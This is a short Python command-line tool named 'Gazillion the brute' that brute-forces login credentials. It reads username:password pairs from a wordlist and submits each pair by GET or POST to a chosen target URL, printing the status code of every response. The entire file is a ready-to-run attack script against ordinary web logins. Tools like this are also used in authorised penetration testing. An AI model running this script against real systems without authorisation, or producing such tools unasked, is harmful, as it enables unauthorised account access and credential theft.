#!/usr/bin/env python3
import sys
import requests
from urllib.parse import urlsplit

method = 'get'
hR = ''
target = ''
file_path = 'default_wordlist.txt'
protocol = 'https'

def print_help():
    tool_name = "Gazillion the brute"
    box_width = len(tool_name) + 4  # Width of the box is the length of the tool name plus padding

    # Print the colorful box with the tool name at the top
    print(f"\033[1;33m{'*' * box_width}")
    print(f"* \033[1;32m{tool_name.upper()}\033[1;33m *")
    print(f"{'*' * box_width}\033[0m")

    # Print the help message with colors
    print("\n\033[1;36mOPTIONS:")
    print("  -m <method>: Method of the request")
    print("  -t <target>: Target URL")
    print("  -p <protocol>: Protocol options are ['http', 'https','ftp']")
    print("  -hR: Hide response status code")
    print("  -w <wordlist>: Path to the wordlist file (default: default_wordlist.txt)")
    print("  -h: Help\033[0m")

    print("\n\033[1;93mEXAMPLE:")
    print(f" \033[1;93mpython3 brute.py -t 'your_target.com' -m post -p https -hR 500,404 -w default_wordlist.txt\033[0m")


def send_words_to_url(target,file_path,method,protocol):
	with open(file_path,'r') as file:
		word_list = [line.strip() for line in file]
	print('\033[1;32mThe brute force attack is about to commence.\033[0m')
	print('=================================================================')
	print('      Payload                                   Response')
	print('=================================================================')
	if method == 'get':
		for word in word_list:
			split_word = word.split(':')
			payload = {'username':split_word[0],'password':split_word[1]}
			response = requests.get(protocol + '://' + target,params = payload)
			if str(response.status_code) not in hR:
				print(payload,'======>',response.status_code)
	elif method == 'post':
		for word in word_list:
			split_word = word.split(':')
			payload = {'username':split_word[0],'password':split_word[1]}
			response = requests.post(protocol + '://' + target,data = payload)
			if str(response.status_code) not in hR:
				print(payload,'======>',response.status_code)
	return

for i in range(1,len(sys.argv),2):
	if sys.argv[i] == "-t":
		url_parts = urlsplit(sys.argv[i+1])
		if url_parts.netloc:
			target = url_parts.netloc
		elif url_parts.path:
			target =  url_parts.path
		else:
			print('Invalid target, use -h to get the manual')
			break
	elif sys.argv[i] == "-w":
		file_path = sys.argv[i+1]
	elif sys.argv[i] == "-m":
		method = sys.argv[i+1]
	elif sys.argv[i] == "-p":
		protocol = sys.argv[i+1]
	elif sys.argv[i] == '-hR':
		hR = sys.argv[i+1].split(',')
	elif sys.argv[i] == '-h':
		print_help()
		break
	else:
		print('Invalid arguments, use -h to get the manual')
		break
	if i+2 == len(sys.argv):
		print("Target:", target)
		print("File Path:", file_path)
		print("Method:", method)
		print("Protocol:", protocol)
		if len(hR) > 0:
			print("Hide Status Code:", hR)
		send_words_to_url(target,file_path,method,protocol)
